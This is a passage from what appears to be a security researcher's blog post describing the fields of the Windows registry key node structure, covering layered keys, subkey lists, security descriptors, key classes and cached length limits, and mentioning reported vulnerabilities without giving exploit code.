 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;These four states are:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_gvci0hu7yb6k-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span&gt;Merge-Backed (0): the properties of the key are meant to be &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;merged&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;with the properties of the underlying keys in the key stack.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Tombstone (1): the key is deleted at the current level, so none of the keys below it should be considered.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Supersede-Local (2): the properties of the key fully supersede any state in the key stack below it: only values associated with that level (and any upper layers) are visible to the user.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span&gt;Supersede-Tree (3): same as Supersede-Local, but it applies to the key itself &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;recursively to all of its subkeys.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;There is also an additional, implicit state called Merge-Unbacked, used to describe keys that don&amp;#39;t exist in a hive at a given level, and so they simply &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;fall through&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the state represented by keys in the lower layers. Overall, layer semantics play a crucial role in the functionality of layered keys and differencing hives, and their correct handling in the registry implementation is paramount to system security and stability. Unfortunately, the feature is too complex to thoroughly discuss here, but there are some excellent resources on the subject: Microsoft&amp;#39;s &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://patents.google.com/patent/US20170279678A1/en&quot;&gt;Containerized Configuration&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(US20170279678A1) patent, Maxim Suhanov&amp;#39;s &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://dfir.ru/2020/08/15/containerized-registry-hives-in-windows/&quot;&gt;Containerized registry hives in Windows&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;blog post, and the &amp;quot;Registry virtualization&amp;quot; section in Chapter 10 of the &lt;/span&gt;&lt;span&gt;Windows Internals 7 (Part 2) book.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.rwwt0whi7zk&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;InheritClass&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This bit is also related to layered keys, and it indicates whether the key inherits the class value from its counterparts lower in the key stack, or defines its own (or lack thereof).&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.mhrruzem097e&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Parent&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The field identifies the key node that acts as this key&amp;#39;s parent within the registry&amp;#39;s hierarchical structure. Except for root keys, which exist at the topmost level of a hive, every key must have a valid Parent field. This index plays a vital role in navigating the registry and modifying key relationships. For example, it&amp;#39;s essential for determining a key&amp;#39;s full path or ensuring correct alphabetical order when renaming a key within its parent&amp;#39;s subkey list.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.uzk1l7jt1mqd&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;SubKeyCounts&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This two-element array of DWORDs stores the number of the key&amp;#39;s stable and volatile subkeys, respectively. Even though the integers are 32 bits wide, the actual number of subkeys is limited by the upper bound of all keys in a hive in a specific storage space, which is roughly 2 GiB (storage space size) &amp;divide; 84 bytes (minimum key node size) &amp;asymp; 25.5 million keys.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The data in this field is somewhat redundant, as the same information is also stored in the subkey indexes themselves. Nevertheless, the cached numbers stored directly in the key node make it possible to efficiently query the numbers of subkeys with API such as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya&quot;&gt;RegQueryInfoKey&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. The kernel does its best to keep the two copies of the information in sync, and any discrepancies between them may lead to memory corruption vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.4ye7pxjg5ush&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;SubKeyLists&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is another two-element array, which complements the previous SubKeyCounts member by providing cell indexes to the corresponding subkey lists for each storage type. The format of these lists is discussed in detail in the &amp;quot;Subkey indexes&amp;quot; section below; for now, it&amp;#39;s only important to know that if SubKeyCounts[x] &amp;gt; 0, then SubKeyLists[x] is expected to be a valid cell index, otherwise it should be equal to HCELL_NIL (-1). Furthermore, because the volatile space is a strictly in-memory concept that doesn&amp;#39;t exist on disk, newly loaded hives are always expected to have SubKeyCounts[1] set to 0 and SubKeyLists[1] set to HCELL_NIL.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.mrpnk6kgjhx&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;ValueList&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is a structure of type _CHILD_LIST, which consists of two 32-bit integers: the number of values associated with the key, and a cell index of the actual value list. Here, there is no distinction between stable and volatile values: for any given key, the values always inherit the storage type of the key, so either all of them are stable, or all of them are volatile. Similarly to subkey lists, though, if ValueList.Count is 0, then ValueList.List must be HCELL_NIL.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As mentioned earlier, this field also had a second meaning if the key was a predefined key: in that case, ValueList.Count contained an arbitrary value with the highest bit set, which indicated the top-level HKEY to redirect to, and ValueList.List was completely unused and could contain arbitrary data. As you can imagine, whenever an internal system function started to use such a value list with the assumption it was a normal key, it would operate on an inadequately huge count and an invalid cell index, wrecking havoc in the kernel. Thankfully, this is no longer a possibility due to the deprecation of predefined keys in 2023.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.899fhvgzgrpu&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;ChildHiveReference&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;You may have noticed that ChildHiveReference is part of a union, as it resides at the same offset as the SubKeyLists member (offset 0x1C). It is a special object that is used to implement hive mounting under the \Registry tree, and is unique to keys that have the KEY_HIVE_EXIT flag set (i.e. exit nodes). It is only ever used in memory, and is therefore not applicable to regular hives stored on disk. Its two fields specify the root key of the mounted hive, as a pair of a kernel pointer to the _HHIVE descriptor structure and the cell index of the root key. This breaks the fundamental invariant that hives are self contained and don&amp;#39;t store any virtual address pointers, only cell indexes. It is the only exception to the rule, and only because it is a necessary hack/workaround to implement a feature that &lt;/span&gt;&lt;span&gt;hives&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;normally don&amp;#39;t support: attaching one hive to another in the global system view. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The field and its usage are discussed in more detail in the &amp;quot;Link nodes&amp;quot; section below.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.3j72imy8jww5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Security&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is the cell index of the security descriptor cell corresponding to the key. It is a mandatory field for every type of key in the registry (symbolic links, previously predefined keys etc.), with the only exception being system-managed exit nodes. For every key that has an invalid security descriptor during hive load (e.g. set to HCELL_NIL or just an invalid cell index), it is automatically fixed up to inherit the security descriptor of its parent key. If the root key of a hive has invalid security, the whole hive is rejected with the STATUS_REGISTRY_CORRUPT error code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The security descriptor cell always has the same storage type as the key(s) that it is associated with. So for example, if there are two keys in a hive with the same security properties, one in the stable and the other in the volatile space, then they will reference two different stable/volatile security cells with equivalent data.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;For obvious reasons, the correct handling of this field is crucial to overall system security. In the course of my research, I have discovered &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues?q%3Did:(42451423%2520%257C%252042451425%2520%257C%252042451427%2520%257C%252042451516%2520%257C%252042451552%2520%257C%252042451596%2520%257C%252042451592%2520%257C%252042451601%2520%257C%252042451625)&quot;&gt;9 vulnerabilities&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;directly involving the handling of security descriptors, and a further 4 reported to Microsoft outside of the tracker (WinRegLowSeverityBugs &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/01_Key_node_Security_OOB_read&quot;&gt;#1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/10_CmpKeySecurityIncrementReferenceCount_zero_refcount_crash&quot;&gt;#10&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion&quot;&gt;#13&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies&quot;&gt;#20&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;). They generally didn&amp;#39;t have much to do with the &amp;nbsp;_CM_KEY_NODE.Security field specifically, but rather the formatting of the security cells and higher-level logic related to them:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_q9nppjnnwv68-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Binary formatting of the SECURITY_DESCRIPTOR_RELATIVE structure&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Maintaining the consistency of the doubly-linked list of security descriptors in the hive&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Reference counting security descriptors when operating on keys&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Enforcing proper access checks when opening and creating keys&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Overall, this is probably the most interesting field in the structure from a security research perspective.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.dyhqzn7btv2w&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Class and ClassLength&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;In technical terms, a key class is an optional, immutable blob of 1-65535 bytes associated with a key. It can only be set once, during the creation of a key, through the lpClass argument of the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyExW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API (or the equivalent Class parameter of the NtCreateKey system call). It can be then queried with functions such as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw&quot;&gt;RegQueryInfoKey&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, but cannot be modified without deleting and re-creating the key. If the class exists, then the ClassLength field is set accordingly, and Class is a cell index that points to its backing buffer. Otherwise, ClassLength is set to 0 and Class is HCELL_NIL (-1).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Conceptually, a class can be viewed as an extra, hidden value of a key, existing alongside the normal value list. It is not displayed anywhere in the Regedit GUI, but if it exists for a given key, it can be retrieved by using the &amp;quot;Export&amp;quot; option in Regedit to save the key to a .txt file, which also exports the class data. It has existed since the earliest version 1.0 of the regf format &amp;ndash; perhaps as a way to store the &amp;quot;type&amp;quot; of a key similar to how every value has a defined type. Today, it seems to be a mostly obsolete mechanism that doesn&amp;#39;t see much use; even Raymond Chen wrote in his &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://devblogs.microsoft.com/oldnewthing/20090204-00/?p%3D19263&quot;&gt;What is the terminology for describing the various parts of the registry?&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;blog in 2009:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c35&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Bonus chatter&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;There&amp;rsquo;s also this thing called a &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. I have no idea what it&amp;rsquo;s for, so don&amp;rsquo;t ask.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;When I ran a quick scan of the Windows 11 registry, I found the following unique strings being used at least once as a key class:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_l7ahywf1ghkc-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;quot;DynDRootClass&amp;quot;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;quot;GenericClass&amp;quot;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;quot;Network ComputerName&amp;quot;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;quot;REG_SZ&amp;quot;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;quot;Shell&amp;quot;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520(REGF)%2520format.asciidoc&quot;&gt;Windows NT Registry File (REGF) format specification&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;lists several other values that have been observed in the past, such as &amp;quot;activeds.dll &amp;quot;, &amp;quot;Cygwin&amp;quot;, &amp;quot;OS2SS&amp;quot; or &amp;quot;TCPMon&amp;quot;. It is worth noting that the class was also used to store the encryption keys for the now-deprecated SAM database encryption mechanism known as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://moyix.blogspot.com/2008/02/syskey-and-sam.html&quot;&gt;SysKey&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. Overall, due to its simplistic nature, key classes are not particularly security-relevant, but may be of interest in the context of obfuscation and hiding data, as they are easily accessible and yet a largely overlooked part of the registry.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.7gz2pgsorsij&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;MaxNameLen, MaxClassLen, MaxValueNameLen and MaxValueDataLen&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;These four fields store cached information about the maximum lengths of several properties of the key or its subkeys:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_175jp61awd4f-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;MaxNameLen:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the maximum length of a subkey&amp;#39;s name,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;MaxClassLen:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the maximum length of a subkey&amp;#39;s class information,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;MaxValueNameLen:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the maximum length of a value name associated with the key,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;MaxValueDataLen:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the maximum length of a value data associated with the key.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The presumed purpose of these members is to facilitate a quick lookup of the per-key limits, such that when a client application wants to enumerate/query subkeys or values, it can simply allocate a single buffer guaranteed to accommodate every possible key name, value name, etc. And so, their exact values can be retrieved with the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw&quot;&gt;RegQueryInfoKey&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;API via the lpcbMaxSubKeyLen, lpcbMaxClassLen, lpcbMaxValueNameLen and lpcbMaxValueLen arguments.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Although querying these limits seems convenient, there are some caveats that are important to keep in mind:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4ao7uanj5htj-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The fields are intended to represent the lower bound of the number of bytes required to store the given property, but not necessarily to be optimal (i.e. to be the smallest sufficient length). For example, when a key with formerly the longest name is deleted, the MaxNameLen field of the parent is not updated with the value of the second-largest length, as that would require the lengthy process of iterating through all of the subkeys again. Therefore, relying on those values may incur some unwanted memory overhead.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;When operating on registry keys that are globally visible in the registry tree, it is possible that a race condition with another application causes one of the maxima to change in between the RegQueryInfoKey call and the actual data query. To address this, applications should include fallback logic to allocate more memory in the rare case when the obtained maximum proves insufficient.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span&gt;To add to the previous point, after having reverse-engineered and reviewed most of the Configuration Manager code, it is my instinct that these fields continue to be supported throughout the development of new registry features (e.g. differencing hives), but it is mostly on a best-effort basis. For example, during hive load, only MaxValueNameLen and MaxValueDataLen are enforced to have the correct values, while MaxNameLen and MaxClassLen remain unchecked. For this reason, I would personally not rely on the consistency of those values for the security of any client code, and would treat them more as a guidance/supplementary information than the sole source of truth about the key limits.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.gq5esafaale9&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;UserFlags&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This is a field whose name, offset and function (so basically every aspect) has been subject to change over the years. Its current form has existed since Windows Vista, and occupies bits 20-23 of MaxNameLen, which had been previously a 32-bit integer, but was later reduced to 16 bits to make room for these extra flags. In theory, its name may suggest that this member is meant to store user-defined data, but in practice, Microsoft developers quickly found their own use for the bitmask: storing flags related to the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/winprog64/registry-reflection&quot;&gt;Registry Reflection&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;mechanism for providing interoperability between 32-bit and 64-bit applications. You can read more about the meaning of each specific flag &lt;/span&gt;&lt;span 